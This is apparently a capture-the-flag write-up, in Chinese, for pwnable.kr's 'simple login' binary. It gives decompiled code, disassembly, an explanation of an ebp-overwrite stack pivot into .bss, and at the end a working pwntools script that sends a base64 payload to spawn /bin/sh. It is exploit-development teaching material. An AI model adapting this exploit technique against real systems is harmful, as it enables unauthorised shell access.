# simple login

```
[*] '/home/simplelogin/simplelogin'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```


將輸入的內容 b64 decode 後，並且要長度<0xc

將 decode 後內容複製到 bss 段

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int nn_b64_decode_res; // [esp+18h] [ebp-28h]
  char nn_user_input; // [esp+1Eh] [ebp-22h]
  unsigned int nn_b64_len; // [esp+3Ch] [ebp-4h]

  memset(&nn_user_input, 0, 30u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  printf("Authenticate : ");
  _isoc99_scanf("%30s", &nn_user_input);
  memset(&nn_input_bss, 0, 12u);
  nn_b64_decode_res = 0;
  nn_b64_len = Base64Decode((int)&nn_user_input, &nn_b64_decode_res);
  if ( nn_b64_len > 0xC )
  {
    puts("Wrong Length");
  }
  else
  {
    memcpy(&nn_input_bss, nn_b64_decode_res, nn_b64_len);
    if ( auth(nn_b64_len) == 1 )
      correct();
  }
  return 0;
}
```

```c 
_BOOL4 __cdecl auth(int a1)
{
  char v2; // [esp+14h] [ebp-14h]
  char *nn_md5; // [esp+1Ch] [ebp-Ch]
  int v4; // [esp+20h] [ebp-8h]  

  memcpy(&v4, &nn_input_bss, a1);
  nn_md5 = (char *)calc_md5((int)&v2, 12);
  printf("hash : %s\n", nn_md5);
  return strcmp("f87cd601aa7fedca99018a8be88eda34", nn_md5) == 0;
}
```


```c 
void __noreturn correct()
{
  if ( nn_input_bss == 0xDEADBEEF )
  {
    puts("Congratulation! you are good!");
    system("/bin/sh");
  }
  exit(0);
}
```


```
; auth


nn_input_cpy= byte ptr -14h  //size 8  0x14-0xc
nn_md5= dword ptr -0Ch
nn_len= dword ptr  8

push    ebp
mov     ebp, esp
sub     esp, 28h
mov     eax, [ebp+8]
mov     [esp+8], eax
mov     dword ptr [esp+4], offset nn_input_bss
lea     eax, [ebp-14h]
add     eax, 0Ch  // 再加上 0xc 移動到 ptr -0x8
mov     [esp], eax
call    memcpy
mov     dword ptr [esp+4], 0Ch
lea     eax, [ebp-14h]
mov     [esp], eax
call    calc_md5
```



在 auth a1 長度可以到 12 ，從 ptr -0x8 開始蓋，存在 nn_input_cpy overflow ，可以蓋到 ebp ，蓋不到 ret

首先通過控制函數 auth stack 保存的ebp，接著在 auth 結尾處通過 `pop ebp;mov esp,ebp` 控制 main 函數的 esp 的值

然後 main 函數的結尾通過 `mov esp, ebp` 控制 esp 的值，把 esp 移動到 bss 我們輸入可控的地方，因為已經放上 system addr，進而通過 pop eip 控制 eip 的值，最終跳至 system("/bin/sh")

這邊要利用到兩次 ret ，auth and main，先利用蓋掉ebp，使stack在ebp在我們的input 位置

同時input位置存放 08049284 用於呼叫shell




```
.text:08049284                 mov     dword ptr [esp], offset aBinSh ; "/bin/sh"
.text:0804928B                 call    system

.bss:0811EB40 nn_input_bss    db    ? ;     aaaa    addr
.bss:0811EB40                                   
.bss:0811EB41                 db    ? ;
.bss:0811EB42                 db    ? ;
.bss:0811EB43                 db    ? ;
```

```python=
from pwn import *

#rm=process('./login')
context.log_level = 'debug'
rm=remote('pwnable.kr',9003)

nn_input_bss=0x0811EB40
system=0x08049284

rm.recvuntil(":")

payload= b'a'*4 + p32(system) + p32(nn_input_bss)
                                # control esp
payload= b64e(payload)

rm.send(payload)
rm.send('\n')

# rm.recvuntil("hash")

rm.interactive()
```



